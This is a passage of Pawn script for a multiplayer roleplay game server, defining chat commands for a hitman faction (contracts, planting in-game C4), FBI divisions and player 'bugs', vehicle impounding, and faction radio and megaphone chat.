			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not a member of the hitman agency!");
		return 1;
	}
	return 1;
}

CMD:ranks(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] != 4 && PlayerInfo[playerid][pLeader] != 4 && PlayerInfo[playerid][pAdmin] != 6 && PlayerInfo[playerid][pAdmin] < 3 || PlayerInfo[playerid][pAdmin] >= 3 && AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] != 6 && PlayerInfo[playerid][pFaction] != 4 && PlayerInfo[playerid][pLeader] != 4)
		return SendClientMessage(playerid, COLOR_GREY, "You're not a Member of the Hitman Agency!");

	SendClientMessage(playerid, COLOR_WHITE, "|__________________ Agency's Ranks __________________|");

	new string[128];
	foreach(Player, i)
	{
		if(PlayerInfo[i][pFaction] == 4 || PlayerInfo[i][pLeader] == 4)
		{
			if(GoChase[playerid] == 999)
			{
				format(string, sizeof(string), "* Name: %s | Rank %d | Completed Hits: %d | Failed Hits: %d", GetPlayerNameEx(i),PlayerInfo[i][pRank], PlayerInfo[i][pCHits], PlayerInfo[i][pFHits]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			else
			{
				format(string, sizeof(string), "* Name: %s | Rank %d | Completed Hits: %d | Failed Hits: %d | Chasing: %s", GetPlayerNameEx(i),PlayerInfo[i][pRank], PlayerInfo[i][pCHits], PlayerInfo[i][pFHits], GetPlayerNameEx(GoChase[i]));
				SendClientMessage(playerid, COLOR_GREY, string);
			}
		}
	}
	return 1;
}

CMD:profile(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /profile [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			new ftext[24];
			if(PlayerInfo[giveplayerid][pFaction] == 1 || PlayerInfo[giveplayerid][pLeader] == 1)
			{ ftext = "LSPD"; }
			else if(PlayerInfo[giveplayerid][pFaction] == 2 || PlayerInfo[giveplayerid][pLeader] == 2)
			{ ftext = "FBI"; }
			else if(PlayerInfo[giveplayerid][pFaction] == 3 || PlayerInfo[giveplayerid][pLeader] == 3)
			{ ftext = "LSFMD"; }
			else if(PlayerInfo[giveplayerid][pFaction] == 4 || PlayerInfo[giveplayerid][pLeader] == 4)
			{ ftext = "Hitman Agency"; }
			else
			{ ftext = "None"; }
			new f2text[64];
			if(PlayerInfo[giveplayerid][pGang] < 255)
			{
				format(f2text, sizeof(f2text), "%s", FamilyInfo[PlayerInfo[giveplayerid][pGang]][FamilyName]);
			}
			else { f2text = "None"; }
			SendClientMessage(playerid, COLOR_WHITE, "Profile Information:");
			format(string, sizeof(string), "Name: %s", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Age: %d", PlayerInfo[giveplayerid][pAge]);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Organisation: %s", ftext);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Family: %s", f2text);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Bounty: $%d", PlayerInfo[giveplayerid][pHeadValue]);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	return 1;
}

CMD:hbadge(playerid, params[]) {
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
		if(isnull(params)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /hbadge [faction]");
			SendClientMessage(playerid, COLOR_GRAD3, "|0 Normal |1 LSPD |2 FBI |3 LSFMD ");
		}
		else switch(strval(params)) {
			case 0: {
		        SendClientMessage(playerid, COLOR_WHITE, "You have set your badge back to normal.");
		        SetPlayerColor(playerid,TEAM_HIT_COLOR);
			}
			case 1: {
			    SendClientMessage(playerid, COLOR_WHITE, "You have set your badge to LSPD.");
			    SetPlayerColor(playerid,TEAM_BLUE_COLOR);
			}
			case 2: {
			    SendClientMessage(playerid, COLOR_WHITE, "You have set your badge to FBI.");
			    SetPlayerColor(playerid,TEAM_FBI_COLOR);
			}
			case 3: {
			    SendClientMessage(playerid, COLOR_WHITE, "You have set your badge to LSFMD.");
			    SetPlayerColor(playerid, TEAM_MED_COLOR);
			}
			default: SendClientMessage(playerid, COLOR_GREY, "Invalid faction specified.");
		}
	}
	return 1;
}

CMD:plantbomb(playerid, params[]) {
	return cmd_pb(playerid, params);
}

CMD:pb(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		if(PlayerInfo[playerid][pC4] == 0)
		{
			if(PlayerInfo[playerid][pBombs] != 0)
			{
				if(IsPlayerInAnyVehicle(playerid))
				{
					SendClientMessage(playerid, COLOR_LIGHTRED,"You can't plant C4 while in a vehicle!");
					return 1;
				}
				GetPlayerPos(playerid,Positions[0][0], Positions[0][1], Positions[0][2]);
				SetPVarFloat(playerid, "DYN_C4_FLOAT_X", Positions[0][0]);
				SetPVarFloat(playerid, "DYN_C4_FLOAT_Y", Positions[0][1]);
				SetPVarFloat(playerid, "DYN_C4_FLOAT_Z", Positions[0][2]);
				PlayerInfo[playerid][pC4] = CreateDynamicObject(1654, Positions[0][0], Positions[0][1], Positions[0][2]-0.9, 0, 89.325012207031, 3.9700012207031);
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
				SendClientMessage(playerid, COLOR_GREEN, "You have placed C4 on the ground, /pickupbomb to remove it.");
				//PlayerInfo[playerid][pC4] = 1;
				PlayerInfo[playerid][pBombs]--;
				PlayerInfo[playerid][pC4Used] = 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You do not have C4!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " You can only deploy 1 C4 at a time ! ");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not a member of the Hitman Agency ! ");
	}
	return 1;
}

CMD:plantcarbomb(playerid, params[]) {
	return cmd_pcb(playerid, params);
}

CMD:pcb(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		if(PlayerInfo[playerid][pC4] == 0)
		{
			if(PlayerInfo[playerid][pBombs] != 0)
			{
				new carid = GetPlayerVehicleID(playerid);
				new closestcar = GetClosestCar(playerid, carid);
				if(IsPlayerInRangeOfVehicle(playerid, closestcar, 4.0))
				{
					if(VehicleBomb{closestcar} == 1)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "There is already a C4 on the vehicle engine!");
						return 1;
					}
					VehicleBomb{closestcar} = 1;
					PlacedVehicleBomb[playerid] = closestcar;
					ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
					ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
					SendClientMessage(playerid, COLOR_GREEN, "You have placed C4 on the vehicle engine, /pickupbomb to remove it.");
					PlayerInfo[playerid][pC4] = 1;
					PlayerInfo[playerid][pBombs]--;
					PlayerInfo[playerid][pC4Used] = 2;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You're not close enough to any vehicle!");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "You do not have C4!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " You can only deploy 1 C4 at a time ! ");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not a member of the Hitman Agency ! ");
	}
	return 1;
}

CMD:pickupbomb(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] != 4 && PlayerInfo[playerid][pLeader] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a Hitman!");
		return 1;
	}
	if(PlayerInfo[playerid][pC4] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "You haven't planted a bomb!");
		return 1;
	}
	new carid = GetPlayerVehicleID(playerid);
	new closestcar = GetClosestCar(playerid, carid);
	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 4.0) && VehicleBomb{closestcar} == 1)
	{
		VehicleBomb{closestcar} = 0;
		PlacedVehicleBomb[playerid] = INVALID_VEHICLE_ID;
		PickUpC4(playerid);
		SendClientMessage(playerid, COLOR_GREEN, "Bomb picked up successfully.");
		PlayerInfo[playerid][pBombs]++;
		PlayerInfo[playerid][pC4Used] = 0;
		PlayerInfo[playerid][pC4Get] = 1;
		return 1;
	}
	if(IsPlayerInRangeOfPoint(playerid, 3.0, GetPVarFloat(playerid, "DYN_C4_FLOAT_X"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Y"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Z")))
	{
		PickUpC4(playerid);
		SendClientMessage(playerid, COLOR_GREEN, "Bomb picked up successfully.");
		PlayerInfo[playerid][pBombs]++;
		PlayerInfo[playerid][pC4Used] = 0;
		PlayerInfo[playerid][pC4Get] = 1;
		return 1;
	}
	return 1;
}

CMD:showmehq(playerid, params[])
{
    if(CheckPointCheck(playerid)) {
        SendClientMessage(playerid, COLOR_WHITE, "Please ensure that your current checkpoint is destroyed first (you either have material packages, or another existing checkpoint).");
        return 1;
    }
    if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
        SetPlayerCheckpoint(playerid,-418.68, -1759.65, 6.22, 4.0);
        GameTextForPlayer(playerid, "~w~Waypoint set ~r~HQ", 5000, 1);
        gPlayerCheckpointStatus[playerid] = CHECKPOINT_HITMAN;
    }
    return 1;
}

CMD:deletehit(playerid, params[])
{
	//if((PlayerInfo[playerid][pAdmin] >= 4 && AdminDuty[playerid] == 1) || (PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pRank] >= 5) || PlayerInfo[playerid][pLeader] == 4)
    if(PlayerInfo[playerid][pAdmin] >= 4 && AdminDuty[playerid] == 1)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /deletehit [playerid/partofname]");

		if(!IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
			return 1;
		}

		if(PlayerInfo[giveplayerid][pHeadValue] >= 1)
		{
			format(string, sizeof(string), "%s has removed the contract on %s ($%d)", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), PlayerInfo[giveplayerid][pHeadValue]);
			Log("logs/contracts.log", string);
			PlayerInfo[giveplayerid][pHeadValue] = 0;
			format(string, sizeof(string), "You have removed the contract which was on %s's head.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
			GoChase[giveplayerid] = 999;

			foreach(Player, i)
			{
				if(HitToGet[i] == giveplayerid)
				{
					HitToGet[i] = 999;
					HitOffer[i] = 999;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "There's not an active contract on that player!");
		}
	}
	return 1;
}

CMD:contract(playerid, params[])
{
	if(PlayerCuffed[playerid] != 0) return SendClientMessage(playerid, COLOR_GREY, "You can't place contracts while in cuffs.");
	if(PlayerInfo[playerid][pJailTime] > 0) return SendClientMessage(playerid, COLOR_GREY, "You can't place contracts while in jail.");

	new string[128], giveplayerid, moneys, detail[32];
	if(sscanf(params, "uds[32]", giveplayerid, moneys, detail)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /contract [playerid/partofname] [amount] [details]");

	if(moneys < 5000 || moneys > 50000)
	{
		SendClientMessage(playerid, COLOR_GREY, "You can't place contracts that are less than $5,000 or more than $50,000.");
		return 1;
	}
	else if((moneys < 10000 || moneys > 50000) && IsACop(giveplayerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "The minimum hit amount for a law enforcement officer is $10,000 and can't be more than $50,000.");
		return 1;
	}
	if(PlayerInfo[playerid][pLevel] < 2)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You must be level 2 to place a contract.");
		return 1;
	}
	if(PlayerInfo[giveplayerid][pConnectTime] < 12)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You can't place contracts on players with less than 12 playing hours.");
		return 1;
	}
	if(AdminDuty[giveplayerid] == 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You can't contract on-duty admins.");
		return 1;
	}
	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't place contracts as a hitman.");
		}
		else
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(moneys >= 50001)
				{
					SendClientMessage(playerid, COLOR_GREY, "The maximum contract price is $50,000!");
					return 1;
				}

				if(PlayerInfo[giveplayerid][pHeadValue] >= 50000)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has the maximum on their head.");
					return 1;
				}
				if(moneys + PlayerInfo[giveplayerid][pHeadValue] >= 50001)
				{
					SendClientMessage(playerid, COLOR_GREY, "That player has the maximum on their head.");
					return 1;
				}

				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't contract yourself."); return 1; }
				new playermoney = GetPlayerCash(playerid);
				if(moneys > 0 && playermoney >= moneys)
				{
					if(strlen(detail) > 32) return SendClientMessage(playerid, COLOR_GRAD1, "Contract details may not be longer than 32 characters in length.");
					GivePlayerCash(playerid, (0 - moneys));
					PlayerInfo[giveplayerid][pHeadValue]+=moneys;
					strmid(PlayerInfo[giveplayerid][pContractBy], GetPlayerNameEx(playerid), 0, strlen(GetPlayerNameEx(playerid)), MAX_PLAYER_NAME);
					strmid(PlayerInfo[giveplayerid][pContractDetail], detail, 0, strlen(detail), 32);

					format(string, sizeof(string), "%s has placed a contract on %s for $%d, details: %s.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), moneys, detail);
					SendFamilyMessage(4, COLOR_YELLOW, string);

					format(string, sizeof(string), "* You placed a contract on %s for $%d, details: %s.",GetPlayerNameEx(giveplayerid), moneys, detail);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

					format(string, sizeof(string), "%s has placed a contract on %s for $%d, details: %s",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),moneys,detail);
					Log("logs/contracts.log", string);

					format(string, sizeof(string), "%s has placed a contract on %s for $%d, details: %s.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), moneys, detail);
					ABroadCast(COLOR_YELLOW,string,4);

					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "You don't have enough money for this.");
				}
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:fbi(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

		if(IsPlayerInRangeOfPoint(playerid,3,310.3679,-1537.5204,-45.1338) || GetPlayerVirtualWorld(playerid) == 444 || IsPlayerInRangeOfPoint(playerid,3.5,255.385696, 77.201263, 1003.640625))
		{
			ShowPlayerDialogEx(playerid, FDUTYMENU, DIALOG_STYLE_LIST, "FBI Menu","Duty\nEquipment\nSWAT Uniform\nUniform\nUndercover\nClear Suspect", "Select", "Cancel");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "You're not in range of your FBI lockers.");
		}
	}
	return 1;
}

CMD:fbidiv(playerid, params[])
{
	if(IsACop(playerid))
	{
		new string[128], giveplayerid, division;
		if(sscanf(params, "ud", giveplayerid, division))
		{
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fbidiv [playerid/partofname] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 1 (None), 2 (GU), 3 (FAN), 4 (CID), 5 (IA)");
			return 1;
		}
		if(PlayerInfo[playerid][pFaction] == 2 && PlayerInfo[playerid][pRank] >= 4)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
				{
					if(division == 3)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 3;
							format(string, sizeof(string), "You're now in the FAN division, invited by %s.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have invited %s into the FAN division.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 5)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 5;
							format(string, sizeof(string), "You're now in the IA division, invited by %s.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have invited %s to join the IA division.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 4)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 4;
							format(string, sizeof(string), "You're now in the CID division, invited by %s.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have invited %s to join the CID division.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 2)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 2;
							format(string, sizeof(string), "You're now in the GU division, invited by %s.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have invited %s to join the GU division.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 1)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 1;
							format(string, sizeof(string), "You have been kicked from your division by %s.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "You have kicked %s out of their division.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
				}

			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command - only R4+ can do this.");
		}
	}
	return 1;
}

CMD:bug(playerid, params[]) {
    if(PlayerInfo[playerid][pFaction] == 2) {

        new
			iTargetID;

        if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /bug [playerid/partofname]");
		}
        else if(AdminDuty[iTargetID] == 1) {
			SendClientMessage(playerid, COLOR_GREY, "You can't place bugs on admins.");
		}
  		else if(PlayerInfo[iTargetID][pBugged] == 1) {

			new
				szMessage[32 + MAX_PLAYER_NAME];

    		PlayerInfo[iTargetID][pBugged] = 0;
     		format(szMessage,sizeof(szMessage),"The bug on %s has been disabled.", GetPlayerNameEx(iTargetID));
       		SendClientMessage(playerid, COLOR_GRAD1, szMessage);
		}
		else if(ProxDetectorS(4.0, playerid, iTargetID)) {

			new
				szMessage[28 + MAX_PLAYER_NAME];

   			PlayerInfo[iTargetID][pBugged] = 1;
	    	format(szMessage,sizeof(szMessage),"You have placed a bug on %s.",GetPlayerNameEx(iTargetID));
		    SendClientMessage(playerid, COLOR_GRAD1, szMessage);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "You need to be close to the person.");
	}
	return 1;
}

CMD:togbr(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 2) {
		if(gBug[playerid] == 0)
		{
			gBug[playerid] = 1;
			SendClientMessage(playerid, COLOR_GRAD2, "Bug chat channel enabled. You will now be able to hear transmissions from all active bugs.");
		}
		else
		{
			gBug[playerid] = 0;
			SendClientMessage(playerid, COLOR_GRAD2, "Bug chat channel disabled.");
		}
	}
	return 1;
}

CMD:impound(playerid, params[]) {
	switch(PlayerInfo[playerid][pFaction]) {
		case 1, 2: {
			if(!IsAtImpoundingPoint(playerid))
			{
				SendClientMessage(playerid, COLOR_GREY, "You're not near the impound point, you can't impound!");
				return 1;
			}
			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
			{

				new
					iVehType,
					iVehIndex,
					iTargetOwner,
					iVehTowed = GetVehicleTrailer(GetPlayerVehicleID(playerid));

				if(!GetVehicleModel(iVehTowed)) {
					return SendClientMessage(playerid, COLOR_GREY, "The vehicle in tow has been desynced and therefore can't be impounded.");
				}
				foreach(Player, i) {
					iVehIndex = GetPlayerVehicle(i, iVehTowed);
					if(iVehIndex != -1) {
						iVehType = 1;
						iTargetOwner = i;
						break;
					}
				}
				if(!iVehType) {
					for(new i; i < MAX_FAMILY; ++i) {
						iVehIndex = GetGangVehicle(i, iVehTowed);
						if(iVehIndex != -1) {
							iVehType = 2;
							iTargetOwner = i;
							break;
						}
					}
				}
				switch(iVehType) {
					case 0, 2: {
						SendClientMessage(playerid, COLOR_GRAD1, "The impound administration could not find any registration on the vehicle and has returned it.");
						DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
						SetVehiclePos(iVehTowed, 0, 0, 0); // Attempted desync fix
						SetVehicleToRespawn(iVehTowed);
					}
					case 1: {

						PlayerVehicleInfo[iTargetOwner][iVehIndex][pvImpounded] = 1;
						PlayerVehicleInfo[iTargetOwner][iVehIndex][pvSpawned] = 0;
						PlayerVehicleInfo[iTargetOwner][iVehIndex][pvId] = INVALID_PLAYER_VEHICLE_ID;
						DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
						SetVehiclePos(iVehTowed, 0, 0, 0); // Attempted desync fix
						DestroyVehicle(iVehTowed);
						VehicleRadioStation[iVehTowed] = 0;

						VehicleSpawned[iTargetOwner]--;
						--PlayerCars;

						new
							szMessage[96];

						format(szMessage, sizeof(szMessage),"* You have impounded %s's %s.",GetPlayerNameEx(iTargetOwner), VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);

						format(szMessage, sizeof(szMessage), "Your %s has been impounded. You may release it at the DMV in Dillimore.", VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
						SendClientMessage(iTargetOwner, COLOR_LIGHTBLUE, szMessage);

						format(szMessage, sizeof(szMessage), "HQ: %s has impounded %s's %s ($%i unpaid tickets).", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetOwner), VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400], PlayerVehicleInfo[iTargetOwner][iVehIndex][pvTicket]);
						SendRadioMessage(PlayerInfo[playerid][pFaction], RADIO, szMessage);
					}
				}
				arr_Towing[playerid] = INVALID_VEHICLE_ID;
			}
		}
		default: SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command.");
	}
	return 1;
}

CMD:dispatch(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
		if(PlayerInfo[playerid][pRank] >= 3) {
			if(isnull(params))
				return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /dispatch [message]");
			else {
				new
					szMessage[128];
				format(szMessage, sizeof(szMessage), "Dispatch: %s, over.", params);
				SendRadioMessage(PlayerInfo[playerid][pFaction], RADIO, szMessage);
			}
		} else SendClientMessage( playerid, COLOR_GRAD2, "You do not meet the rank requirement to use this command (rank 3)." );
	} else SendClientMessage(playerid, COLOR_GRAD2, "You're not a law enforcement officer.");
	return true;
}

CMD:r(playerid, params[]) {
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/r)adio [radio chat]");

	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 9) {
	    new
	        szMessage[128],
	        szRank[64],
	        szEmployer[64],
	        szDivision[64];

        GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

        if(!strlen(szDivision) || !strcmp(szDivision, "None", true)) {
			format(szMessage, sizeof(szMessage), "** %s %s: %s **", szRank, GetPlayerNameEx(playerid), params);
		} else {
		    format(szMessage, sizeof(szMessage), "** %s (%s) %s: %s **", szRank, szDivision, GetPlayerNameEx(playerid), params);
		}

		switch(PlayerInfo[playerid][pFaction]) {
			case 1: SendRadioMessage(1, RADIO, szMessage);
			case 2: SendRadioMessage(2, RADIO, szMessage);
			case 3: SendRadioMessage(3, TEAM_CYAN_COLOR, szMessage);
			case 5: SendRadioMessage(5, COLOR_GOV, szMessage);
			case 9: SendRadioMessage(9, TEAM_NEWS_COLOR, szMessage);
		}

		format(szMessage, sizeof(szMessage), "(radio) %s", params);
		SetPlayerChatBubble(playerid, szMessage, COLOR_WHITE, 15.0,5000);

		printf("%s ('** %s %s %s: %s **')", szEmployer, szRank, szDivision, GetPlayerNameEx(playerid), params);
	}

	return 1;
}

CMD:d(playerid, params[]) {
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/d)epartments [department chat]");

	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
	    new
	        szMessage[128],
	        szRank[64],
	        szEmployer[64],
	        szDivision[64];

        GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

        if(!strlen(szDivision) || !strcmp(szDivision, "None", true)) {
			format(szMessage, sizeof(szMessage), "** %s %s %s: %s **", szEmployer, szRank, GetPlayerNameEx(playerid), params);
		} else {
		    format(szMessage, sizeof(szMessage), "** %s %s (%s) %s: %s **", szEmployer, szRank, szDivision, GetPlayerNameEx(playerid), params);
		}

		SendRadioMessage(1, DEPTRADIO, szMessage);
		SendRadioMessage(2, DEPTRADIO, szMessage);
	 	SendRadioMessage(3, DEPTRADIO, szMessage);
		SendRadioMessage(5, DEPTRADIO, szMessage);

		format(szMessage, sizeof(szMessage), "(radio) %s", params);
		SetPlayerChatBubble(playerid, szMessage, COLOR_WHITE, 15.0, 5000);

		foreach(Player, i)
		{
			if(PlayerInfo[i][pReceiver] > 0)
			{
				if(GetPVarType(i, "pReceiverOn"))
				{
					if(GetPVarInt(i, "pReceiverMLeft") > 0)
					{
						format(szMessage, sizeof(szMessage), "** (receiver) %s: %s **", GetPlayerNameEx(playerid), params);
						SendClientMessage(i, DEPTRADIO, szMessage);
						SetPVarInt(i, "pReceiverMLeft", GetPVarInt(i, "pReceiverMLeft") - 1);
					}
					else
					{
						PlayerInfo[i][pReceiver]--;
						SetPVarInt(i, "pReceiverMLeft", 40);
						SendClientMessage(i, DEPTRADIO, "Your receiver ran out of batteries!");
					}
				}
			}
			return 1;
		}
	}
	return 1;
}

CMD:m(playerid, params[]) {
	if(!isnull(params)) {
		if((GetPVarInt(playerid, "EventToken") == 1 || PlayerInfo[playerid][pJailTime] > 0) && AdminDuty[playerid] == 0)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
		switch(PlayerInfo[playerid][pFaction]) {
			case 1, 2, 3, 5, 9: {

				new
					szMessage[128];

				format(szMessage, sizeof(szMessage), "(megaphone) %s: %s", GetPlayerNameEx(playerid), params);
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			default: SendClientMessage(playerid, COLOR_GRAD2, "   You do not have authority to use the megaphone.");
		}
	} else SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/m)egaphone [megaphone chat]");
	return 1;
}

CMD:su(playerid, params[]) {
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		if(PlayerInfo[playerid][pJailed] > 0) {
			return SendClientMessage(playerid, COLOR_WHITE, "You can't use this in jail/prison.");
		}

		new
			iTargetID,
			szCrime[64];

		if(sscanf(params, "us[64]", iTargetID, szCrime)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: (/su)spect [playerid/partofname] [crime description]");
		}
		else if(!IsPlayerConnected(iTargetID)) {
			SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
		}
		else if(IsACop(iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "You can't use this command on a law enforcement officer.");
		}
		else if(PlayerInfo[iTargetID][pFaction] == 5) {
			SendClientMessage(playerid, COLOR_GREY, "This person has diplomatic immunity.");
		}
		else if(PlayerInfo[iTargetID][pWantedLevel] >= 6) {
			SendClientMessage(playerid, COLOR_GRAD2, "Target is already most wanted.");
		}
		else {

			new
				szMessage[128];

			++PlayerInfo[iTargetID][pCrimes];
			SetPlayerWantedLevel(iTargetID, ++PlayerInfo[iTargetID][pWantedLevel]);
			if(PlayerInfo[iTargetID][pWantedLevel] > 5)
 			{
				SetPlayerColor(iTargetID, WANTED_COLOR);
